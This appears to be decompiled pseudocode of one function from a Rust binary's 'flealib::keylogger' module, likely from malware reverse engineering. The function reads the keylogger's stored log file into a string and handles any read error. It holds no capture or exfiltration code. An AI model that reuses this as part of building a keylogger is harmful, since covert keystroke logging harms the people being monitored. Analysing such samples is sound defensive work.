__int64 __fastcall flealib::keylogger::get_key_logger_content(__int64 a1)
{
  __int64 v2; // [rsp+0h] [rbp-28h] BYREF
  __int128 v3; // [rsp+8h] [rbp-20h] BYREF
  __int64 v4; // [rsp+18h] [rbp-10h]

  std::fs::read_to_string(&v3);
  if ( __OFSUB__(0LL, (_QWORD)v3) )
  {
    v2 = *((_QWORD *)&v3 + 1);
    <T as alloc::string::SpecToString>::spec_to_string(a1, &v2);
    core::ptr::drop_in_place<std::io::error::Error>(&v2);
  }
  else
  {
    *(_QWORD *)(a1 + 16) = v4;
    *(_OWORD *)a1 = v3;
  }
  return a1;
}